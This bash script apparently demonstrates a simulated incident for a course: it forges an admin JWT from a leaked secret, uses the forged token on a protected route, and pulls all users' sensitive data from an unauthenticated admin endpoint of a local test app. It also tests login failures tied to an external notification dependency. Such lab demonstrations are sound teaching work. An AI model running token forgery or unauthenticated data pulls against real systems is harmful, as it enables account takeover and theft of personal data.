#!/usr/bin/env bash
set -uo pipefail
BASE="${BASE_URL:-http://localhost:3000}"
mkdir -p evidencias
OUT="evidencias/incident-output.txt"

echo "== Incidente simulado WellMe (V1 -> V3 -> V2) ==" | tee "$OUT"
date | tee -a "$OUT"

echo -e "\n[1] Login legitimo (Estudante FIAP) e captura de token:" | tee -a "$OUT"
curl -s -w '\nHTTP %{http_code}\n' -X POST "$BASE/auth/login" -H 'Content-Type: application/json' \
  -d '{"name":"Estudante FIAP","heroCode":"FIAP2025"}' | tee -a "$OUT"

echo -e "\n\n[2] (V1) Forja de token ADMIN com o secret vazado (.env.leaked):" | tee -a "$OUT"
FORGED="$(node scripts/forge-token.js)"
echo "$FORGED" | tee -a "$OUT"

echo -e "\n[3] (V1) Token forjado aceito na rota protegida /auth/me:" | tee -a "$OUT"
curl -s -w '\nHTTP %{http_code}\n' "$BASE/auth/me" -H "Authorization: Bearer $FORGED" | tee -a "$OUT"

echo -e "\n\n[4] (V3) Exfiltracao: GET /admin/users SEM autenticacao retorna todos os usuarios + dados sensiveis:" | tee -a "$OUT"
curl -s -w '\nHTTP %{http_code}\n' "$BASE/admin/users" | tee -a "$OUT"

echo -e "\n\n[5] (V2) Instabilidade por dependencia externa (notify) - mesma credencial CORRETA, 10 tentativas (200=ok / 500=falha ao notificar):" | tee -a "$OUT"
for i in $(seq 1 10); do
  code="$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/auth/login" \
    -H 'Content-Type: application/json' \
    -d '{"name":"Estudante FIAP","heroCode":"FIAP2025"}')"
  echo "tentativa $i -> HTTP $code" | tee -a "$OUT"
done

echo -e "\n[OK] Evidencias salvas em $OUT e eventos em logs/app.log" | tee -a "$OUT"
